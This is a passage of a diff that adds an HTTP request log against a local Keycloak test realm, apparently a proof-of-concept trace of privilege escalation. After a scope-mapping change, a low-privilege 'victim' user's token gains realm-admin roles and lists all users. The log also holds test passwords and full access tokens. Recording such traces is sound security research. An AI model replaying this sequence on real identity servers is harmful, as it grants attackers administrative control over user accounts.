wsQ8jrAXz_POFpbaQw1DMCiqb7ZnBW5tH0tDryZYlwWMIKLCF6Q-0iMrYJVGO8uJnSMB5YUQ3A","expires_in":300,"refresh_expires_in":1800,"refresh_token":"eyJhbGciOiJIUzUxMiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI0Njc2NjEwNC0zZjVjLTQ3YjgtOWJkYS1hNzRkZmM4MTgyZmIifQ.eyJleHAiOjE3OTUzNjMxNTgsImlhdCI6MTc5NTM2MTM1OCwianRpIjoiZTliOGZjMGMtY2I2Yi1lMGMzLWU5NTAtMGJmNzIxNjAyMjFmIiwiaXNzIjoiaHR0cDovLzEyNy4wLjAuMTo4MDgwL3JlYWxtcy9rMWZnYXAxIiwiYXVkIjoiaHR0cDovLzEyNy4wLjAuMTo4MDgwL3JlYWxtcy9rMWZnYXAxIiwic3ViIjoiN2Q3NWY1YmItZTcyZS00NzllLThiZTMtZTY3ZDFjODk3ZDEyIiwidHlwIjoiUmVmc...[truncated]
+
+--- #41 GET http://127.0.0.1:8080/admin/realms/k1fgap1/users
+>>> 
+<<< HTTP 401
+{"error":"HTTP 401 Unauthorized"}
+
+--- #42 PUT http://127.0.0.1:8080/admin/realms/k1fgap1/clients/99152e65-f88c-4d19-a0b4-610ee74d3df8/default-client-scopes/96ab5362-0137-4973-afa4-d75300dc66c4
+>>> 
+<<< HTTP 204
+
+
+--- #43 POST http://127.0.0.1:8080/realms/k1fgap1/protocol/openid-connect/token
+>>> {"client_id": "portal", "username": "victim", "password": "victimpass", "grant_type": "password", "client_secret": "portal-secret"}
+<<< HTTP 200
+{"access_token":"eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJicmFLb3JXWHpIZmtXczE5NkQtakRLWFpwUjFuRUlPOWZsRUE1MC12akxvIn0.eyJleHAiOjE3OTUzNjE2NTgsImlhdCI6MTc5NTM2MTM1OCwianRpIjoib25ydHJvOjE1OTYzMmY3LTkxNTMtNGQ3Ny1jMWNlLTY3Mjg2OTE5YmM1MiIsImlzcyI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9yZWFsbXMvazFmZ2FwMSIsImF1ZCI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9hZG1pbi9yZWFsbXMvazFmZ2FwMSIsInN1YiI6IjdkNzVmNWJiLWU3MmUtNDc5ZS04YmUzLWU2N2QxYzg5N2QxMiIsInR5cCI6IkJlYXJlciIsImF6cCI6InBvcnRhbCIsInNpZCI6IkQtNW1uZEFTQzlra21YNTY5NVptZUNsWiIsImFjciI6IjEiLCJzY29wZSI6ImtjLWFkbWluLWFwaSBwcm9maWxlIGVtYWlsIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsIm5hbWUiOiJ2aWN0aW0gVGVzdCIsInByZWZlcnJlZF91c2VybmFtZSI6InZpY3RpbSIsImdpdmVuX25hbWUiOiJ2aWN0aW0iLCJmYW1pbHlfbmFtZSI6IlRlc3QiLCJlbWFpbCI6InZpY3RpbUBleGFtcGxlLmxvY2FsIn0.UZ4gMbTcYHfeMGy7_4wRu5ZSswMVsJu8EdVG8NMGd2DrqiMkXGdL2xVtXoImqv0HzzemqV5hFK7Mibh9zZurmbIp3NzsDImOZdsoGkr8Em7J2_D80mOtIzRG5NVNIK_b7St-jF7SInPh1owodRMJhgkKF0gSz0XhH53Uqf68y8rRYJS9BiaknQMndd_MuLGoyHq7JNPMb0bLRthPBt4OLvgG6_5jejrX_KrIGP-rdFiFz_3grbM1-5QamqlS91UtkRwFVTnzVCCY90CtajO3YgHM_WtETA1MET8QHZdWaFhdgCmbP399VlV7FBB12trwsh5zHzjrRJbrahMGF0lvJg","expires_in":300,"refresh_expires_in":1800,"refresh_token":"eyJhbGciOiJIUzUxMiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI0Njc2NjEwNC0zZjVjLTQ3YjgtOWJkYS1hNzRkZmM4MTgyZmIifQ.eyJleHAiOjE3OTUzNjMxNTgsImlhdCI6MTc5NTM2MTM1OCwianRpIjoiMjgyNTFiZTEtYjUzYS1kN2M3LTFlOGUtMWU4NzcxYzg5NjI3IiwiaXNzIjoiaHR0cDovLzEyNy4wLjAuMTo4MDgwL3JlYWxtcy9rMWZnYXAxIiwiYXVkIjoiaHR0cDovLzEyNy4wLjAuMTo4MDgwL3JlYWxtcy9r...[truncated]
+
+--- #44 GET http://127.0.0.1:8080/admin/realms/k1fgap1/users
+>>> 
+<<< HTTP 403
+{"error":"HTTP 403 Forbidden"}
+
+--- #45 POST http://127.0.0.1:8080/admin/realms/k1fgap1/clients/57fa91e9-596e-41b2-8a6c-7806374da6e8/roles/deleg-role/composites
+>>> [{"id": "f7d80c0c-be98-4cbd-a074-80a58b759e1d", "name": "realm-admin"}]
+<<< HTTP 403
+{"error":"HTTP 403 Forbidden"}
+
+--- #46 POST http://127.0.0.1:8080/admin/realms/k1fgap1/clients/d267ea4d-a76d-4868-a40e-0d3018fba52c/scope-mappings/realm
+>>> [{"id": "049d38e6-a4a5-4798-ba58-35a6b0f8947c", "name": "plain-role"}]
+<<< HTTP 403
+{"error":"HTTP 403 Forbidden"}
+
+--- #47 POST http://127.0.0.1:8080/admin/realms/k1fgap1/clients/d267ea4d-a76d-4868-a40e-0d3018fba52c/scope-mappings/realm
+>>> [{"id": "511ee8a5-c5c2-46e5-b67c-9418626fad7d", "name": "innocent-bundle"}]
+<<< HTTP 403
+{"error":"HTTP 403 Forbidden"}
+
+--- #48 POST http://127.0.0.1:8080/realms/k1fgap1/protocol/openid-connect/token
+>>> {"client_id": "portal2", "username": "victim", "password": "victimpass", "grant_type": "password", "client_secret": "portal-secret"}
+<<< HTTP 200
+{"access_token":"eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJicmFLb3JXWHpIZmtXczE5NkQtakRLWFpwUjFuRUlPOWZsRUE1MC12akxvIn0.eyJleHAiOjE3OTUzNjE2NTksImlhdCI6MTc5NTM2MTM1OSwianRpIjoib25ydHJvOjM3ZTViZGI2LTRjNzUtMDgzZC0yMmFlLTNkZDE4ODU3NjczYyIsImlzcyI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9yZWFsbXMvazFmZ2FwMSIsInN1YiI6IjdkNzVmNWJiLWU3MmUtNDc5ZS04YmUzLWU2N2QxYzg5N2QxMiIsInR5cCI6IkJlYXJlciIsImF6cCI6InBvcnRhbDIiLCJzaWQiOiIzc2o5QkhocE13aXdxNFFYNWl0TXpRbkMiLCJhY3IiOiIxIiwic2NvcGUiOiJwcm9maWxlIGVtYWlsIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsIm5hbWUiOiJ2aWN0aW0gVGVzdCIsInByZWZlcnJlZF91c2VybmFtZSI6InZpY3RpbSIsImdpdmVuX25hbWUiOiJ2aWN0aW0iLCJmYW1pbHlfbmFtZSI6IlRlc3QiLCJlbWFpbCI6InZpY3RpbUBleGFtcGxlLmxvY2FsIn0.RfP3fSqAJw7Bk7WJoZ9MSKbyVYIP_A0zZsHRkS5wtgG7TV4-H0J9ddlBkaphH6MAP3hWlu2WivCdnStUAQd8Un4hJRI4g6XHRhCEBScjBD2LgsY-SzaEFtv8x-6JuVkiTdHCOanC5v9Hz4r_4HDqScsk6FiV7hbcLA_wuXbQuU3QE7jmPG0L6-fxmD_Vap2P5IMiHsoS8MZHelVdkzMa4_gZIQ8ml79Ys8eJUPDMoacPrItqm44lFPJnIqY-Ojj6eSSXB20iae7XXvKIvn9ZGTcGX98wSWY0tCSf8ZgQATvFELYqxKRUt6kR39zlK0s5Na7fO4JF3LV8YDtFUlBHDQ","expires_in":300,"refresh_expires_in":1800,"refresh_token":"eyJhbGciOiJIUzUxMiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI0Njc2NjEwNC0zZjVjLTQ3YjgtOWJkYS1hNzRkZmM4MTgyZmIifQ.eyJleHAiOjE3OTUzNjMxNTksImlhdCI6MTc5NTM2MTM1OSwianRpIjoiYjRjOGEwNTEtY2I3MS04NmU3LTg2OTItMTA5NDU0NGI4MDdlIiwiaXNzIjoiaHR0cDovLzEyNy4wLjAuMTo4MDgwL3JlYWxtcy9rMWZnYXAxIiwiYXVkIjoiaHR0cDovLzEyNy4wLjAuMTo4MDgwL3JlYWxtcy9rMWZnYXAxIiwic3ViIjoiN2Q3NWY1YmItZTcyZS00NzllLThiZTMtZTY3ZDFjODk3ZDEyIiwidHlwIjoiUmVm...[truncated]
+
+--- #49 POST http://127.0.0.1:8080/admin/realms/k1fgap1/clients/99152e65-f88c-4d19-a0b4-610ee74d3df8/scope-mappings/clients/315e44f0-14cc-4c7d-92f5-07897ba0b675
+>>> [{"name": "realm-admin"}]
+<<< HTTP 204
+
+
+--- #50 POST http://127.0.0.1:8080/realms/k1fgap1/protocol/openid-connect/token
+>>> {"client_id": "portal", "username": "victim", "password": "victimpass", "grant_type": "password", "client_secret": "portal-secret"}
+<<< HTTP 200
+{"access_token":"eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJicmFLb3JXWHpIZmtXczE5NkQtakRLWFpwUjFuRUlPOWZsRUE1MC12akxvIn0.eyJleHAiOjE3OTUzNjE2NTksImlhdCI6MTc5NTM2MTM1OSwianRpIjoib25ydHJvOmU4NzA3MGQ5LTU5OWUtZTIyMy0wNzIwLWM1NDUzOTU1MDE1NyIsImlzcyI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9yZWFsbXMvazFmZ2FwMSIsImF1ZCI6WyJodHRwOi8vMTI3LjAuMC4xOjgwODAvYWRtaW4vcmVhbG1zL2sxZmdhcDEiLCJyZWFsbS1tYW5hZ2VtZW50Il0sInN1YiI6IjdkNzVmNWJiLWU3MmUtNDc5ZS04YmUzLWU2N2QxYzg5N2QxMiIsInR5cCI6IkJlYXJlciIsImF6cCI6InBvcnRhbCIsInNpZCI6IlVDREJLLTh4eTNDR0lBa29TWFBuemIwZyIsImFjciI6IjEiLCJyZXNvdXJjZV9hY2Nlc3MiOnsicmVhbG0tbWFuYWdlbWVudCI6eyJyb2xlcyI6WyJ2aWV3LWlkZW50aXR5LXByb3ZpZGVycyIsInZpZXctcmVhbG0iLCJtYW5hZ2Utb3JnYW5pemF0aW9ucyIsIm1hbmFnZS1pZGVudGl0eS1wcm92aWRlcnMiLCJpbXBlcnNvbmF0aW9uIiwicmVhbG0tYWRtaW4iLCJjcmVhdGUtY2xpZW50IiwibWFuYWdlLXVzZXJzIiwicXVlcnktcmVhbG1zIiwidmlldy1hdXRob3JpemF0aW9uIiwicXVlcnktY2xpZW50cyIsInF1ZXJ5LXVzZXJzIiwibWFuYWdlLWV2ZW50cyIsIm1hbmFnZS1yZWFsbSIsInZpZXctb3JnYW5pemF0aW9ucyIsInZpZXctZXZlbnRzIiwidmlldy11c2VycyIsInZpZXctY2xpZW50cyIsIm1hbmFnZS1hdXRob3JpemF0aW9uIiwibWFuYWdlLWNsaWVudHMiLCJxdWVyeS1vcmdhbml6YXRpb25zIiwicXVlcnktZ3JvdXBzIl19fSwic2NvcGUiOiJrYy1hZG1pbi1hcGkgcHJvZmlsZSBlbWFpbCIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJuYW1lIjoidmljdGltIFRlc3QiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJ2aWN0aW0iLCJnaXZlbl9uYW1lIjoidmljdGltIiwiZmFtaWx5X25hbWUiOiJUZXN0IiwiZW1haWwiOiJ2aWN0aW1AZXhhbXBsZS5sb2NhbCJ9.Jfuzm4X_WulN5k8NLOpNjMUwIaAq0JTQWhjdIfvxK7i6k_56xJgKpnpJBr-w4xXABWtND8erzVc-TAH1CZWWgzhaKhIBEeVhLTDKs7NAyHU0VX...[truncated]
+
+--- #51 GET http://127.0.0.1:8080/admin/realms/k1fgap1/users
+>>> 
+<<< HTTP 200
+[{"id":"1ed057b6-0d12-4409-8239-1582bf505ce1","username":"delegated","firstName":"delegated","lastName":"Test","email":"delegated@example.local","emailVerified":true,"enabled":true,"createdTimestamp":1795361357746,"totp":false,"disableableCredentialTypes":[],"requiredActions":[],"notBefore":0,"access":{"manage":true}},{"id":"7d75f5bb-e72e-479e-8be3-e67d1c897d12","username":"victim","firstName":"victim","lastName":"Test","email":"victim@example.local","emailVerified":true,"enabled":true,"createdTimestamp":1795361357461,"totp":false,"disableableCredentialTypes":[],"requiredActions":[],"notBefore":0,"access":{"manage":true}}]
+
+--- #52 GET http://127.0.0.1:8080/admin/realms/k1fgap1
+>>> 
+<<< HTTP 200
+{"id":"8044c0ed-31bd-487b-927c-5a11e936f8c9","realm":"k1fgap1","notBefore":0,"defaultSignatureAlgorithm":"RS256","revokeRefreshToken":false,"refreshTokenMaxReuse":0,"accessTokenLifespan":300,"accessTokenLifespanForImplicitFlow":900,"ssoSessionIdleTimeout":1800,"ssoSessionMaxLifespan":36000,"ssoSessionIdleTimeoutRememberMe":0,"ssoSessionMaxLifespanRememberMe":0,"offlineSessionIdleTimeout":2592000,"offlineSessionMaxLifespanEnabled":false,"offlineSessionMaxLifespan":5184000,"clientSessionIdleTimeout":0,"clientSessionMaxLifespan":0,"clientOfflineSessionIdleTimeout":0,"clientOfflineSessionMaxLifespan":0,"accessCodeLifespan":60,"accessCodeLifespanUserAction":300,"accessCodeLifespanLogin":1800,"actionTokenGeneratedByAdminLifespan":43200,"actionTokenGeneratedByUserLifespan":300,"oauth2DeviceCodeLifespan":600,"oauth2DevicePollingInterval":5,"enabled":true,"sslRequired":"external","registrationAllowed":false,"registrationEmailAsUsername":false,"rememberMe":false,"verifyEmail":false,"loginWithEmailAllowed":true,"duplicateEmailsAllowed":false,"resetPasswordAllowed":false,"editUsernameAllowed":false,"bruteForceProtected":false,"permanentLockout":false,"maxTemporaryLockouts":0,"bruteForceStrategy":"MULTIPLE","maxFailureWaitSeconds":900,"minimumQuickLoginWaitSeconds":60,"waitIncrementSeconds":60,"quickLoginCheckMilliSeconds":1000,"maxDeltaTimeSeconds":43200,"failureFactor":30,"maxSecondaryAuthFailures":0,"defaultRole":{"id":"dee503ee-89a6-457d-bdfa-f6f0d866baaa","name":"default-roles-k1fgap...[truncated]
